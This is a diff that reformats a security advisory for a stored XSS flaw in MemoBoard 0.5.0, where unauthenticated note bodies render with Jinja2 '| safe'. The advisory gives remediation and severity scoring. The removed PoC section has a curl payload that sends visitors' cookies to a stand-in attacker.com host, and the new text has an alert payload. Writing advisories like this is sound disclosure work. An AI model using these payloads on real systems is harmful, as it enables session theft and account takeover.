@@ -1,12 +1,44 @@
-# Advisory: MemoBoard stored XSS via unescaped note body (| safe filter)
+# GitHub Security Advisory
 
-## Summary
+Write all fill-in content in English (GitHub Advisory form). Do not use Chinese in Title, Description, or Severity notes. Copy from `### Summary` through Impact into the Description field. Leave Patched versions empty if there is no upstream fix.
 
-MemoBoard v0.5.0 is affected by a stored cross-site scripting (XSS) vulnerability. The note creation endpoint `POST /api/notes` requires no authentication, and the note `body` field is rendered on the public `/notes` page using Jinja2's `| safe` filter, which disables HTML auto-escaping. An anonymous attacker can inject arbitrary JavaScript that executes in every visitor's browser, enabling session cookie theft and account impersonation.
+Do not render this file as HTML in the product UI; keep it as copy-paste Markdown source.
+
+---
+
+## Title
+
+```
+MemoBoard stored XSS via unauthenticated note body rendered with | safe
+```
+
+---
 
 ## Description
 
-The `POST /api/notes` endpoint in `app.py` (lines 87–94) accepts a JSON body with `title`, `body`, and `author` fields without any authentication check:
+Copy from the next `### Summary` through the end of Impact.
+
+### Summary
+
+An unauthenticated caller can `POST /api/notes` with HTML/JavaScript in `body`. The public `GET /notes` page renders that field with Jinja2 `| safe`, so the payload executes in every visitor's browser, including administrators.
+
+### Details
+
+MemoBoard 0.5.0 stores note bodies through `api_create_note` in `src/app.py` with no authentication and no HTML sanitization (`create_note` in `src/board/store.py` is parameterized for SQL, which does not escape HTML). `notes_page` renders `src/templates/notes.html`. The intended control is Jinja2 auto-escaping of `n.body`; `| safe` disables it.
+
+Same-root-cause siblings: unauthenticated write on `POST /api/notes` and the public list on `GET /notes`. Suggested fix: remove `| safe` (or sanitize with a strict HTML allow-list) and require authentication to create notes.
+
+### Vulnerable code
+
+- Path: `src/templates/notes.html:18`
+
+```html
+<div class="body">{{ n.body | safe }}</div>
+```
+
+Unauthenticated write path that stores the body verbatim:
+
+- Path: `src/app.py:87`
 
 ```python
 @app.post("/api/notes")
@@ -19,59 +51,55 @@ def api_create_note():
     return jsonify({"id": note_id, "ok": True}), 201
 ```
 
-The `body` value is stored verbatim in the SQLite database via `create_note` (parameterized query, no sanitization).
+### PoC
 
-The public page `GET /notes` (lines 37–39) renders all notes using the `notes.html` template. On line 18, the body is rendered with the `| safe` filter:
+Requires a running instance you are authorized to test. Do not include real secrets.
 
-```html
-<div class="body">{{ n.body | safe }}</div>
+```http
+POST /api/notes HTTP/1.1
+Host: TARGET:5000
+Content-Type: application/json
+Connection: close
+
+{"title":"test","body":"<script>alert(document.cookie)</script>","author":"anonymous"}
 ```
 
-The `| safe` filter marks the content as trusted, causing Jinja2 to skip its default HTML auto-escaping. As a result, any HTML or JavaScript in the `body` field is output raw into the page HTML. When another user (including an administrator) visits `/notes`, the injected script executes in their browser context.
-
-Since `POST /api/notes` has no authentication and `GET /notes` is a public page visible to all users, an anonymous attacker can plant persistent JavaScript payloads that execute for every visitor, including the admin.
-
-## Affected versions
-
-- MemoBoard v0.5.0 (all versions shipped with the current codebase)
-
-## Impact
-
-An unauthenticated attacker can inject persistent JavaScript into the public notes page. When any other user — including the administrator — visits `/notes`, the script executes in their browser. This enables:
-
-- **Session cookie theft**: Steal the Flask session cookie of any visitor, including admin, enabling session hijacking.
-- **Account impersonation**: Perform actions as the victim (create notes, access admin-only endpoints).
-- **Privilege escalation chain**: Stolen admin session cookies can be used to access the admin-only `/api/tools/ping` endpoint, which is vulnerable to command injection (RCE).
-
-## Proof of concept
-
-```bash
-# 1. Create a note with XSS payload (no authentication required)
-curl -X POST http://TARGET:5000/api/notes \
-  -H "Content-Type: application/json" \
-  -d '{"title":"test","body":"<script>fetch(\"https://attacker.com/steal?c=\"+document.cookie)</script>","author":"anonymous"}'
-
-# Response: {"id":3,"ok":true}
-
-# 2. Fetch the public notes page
-curl http://TARGET:5000/notes
-
-# The HTML contains the raw, unescaped <script> tag:
-# <div class="body"><script>fetch("https://attacker.com/steal?c="+document.cookie)</script></div>
-# When any user visits /notes in a browser, the script executes.
+```http
+GET /notes HTTP/1.1
+Host: TARGET:5000
+Connection: close
 ```
 
-## Remediation
+The HTML response includes the unescaped `<script>` tag. Reproducible CLI in the same directory:
 
-Remove the `| safe` filter from the template so Jinja2's default auto-escaping applies:
-
-```html
-<div class="body">{{ n.body }}</div>
+```text
+python poc.py -u http://TARGET:5000
+python poc.py -u http://TARGET:5000 --proxy http://127.0.0.1:8080
 ```
 
-If rich HTML is required, use a sanitization library such as `bleach` with a strict tag/attribute whitelist before storing or rendering the body. Additionally, add authentication to `POST /api/notes` to prevent anonymous note creation.
+Do not run this against systems you do not own or have authorization to test.
 
-## References
+### Impact
 
-- CWE-79: Improper Neutralization of Input Used During Page Generation ("Cross-site Scripting")
-- Jinja2 documentation: [autoescaping](https://jinja.palletsprojects.com/en/3.1.x/templates/#autoescaping)
+CWE-79. Any visitor of `/notes` (the public memo list) executes attacker-controlled script in their origin. That can steal Flask session cookies and act as the victim, including an administrator. Remaining control: the victim must load `/notes` (passive user interaction). This issue does not by itself execute code on the server.
+
+---
+
+## Affected products
+
+| Field | Value |
+| --- | --- |
+| Ecosystem | `pip` |
+| Package name | memoboard |
+| Affected versions | 0.5.0 |
+| Patched versions | |
+
+---
+
+## Severity / CWE
+
+- **Severity:** High
+- **CVSS 3.1:** 8.2 High — `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N`
+- **CVSS 4.0:** 7.1 High — `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:P/VC:H/VI:L/VA:N/SC:N/SI:N/SA:N`
+- **CWE:** CWE-79 Improper Neutralization of Input During Web Page Generation ("Cross-site Scripting")
+- **Related:**
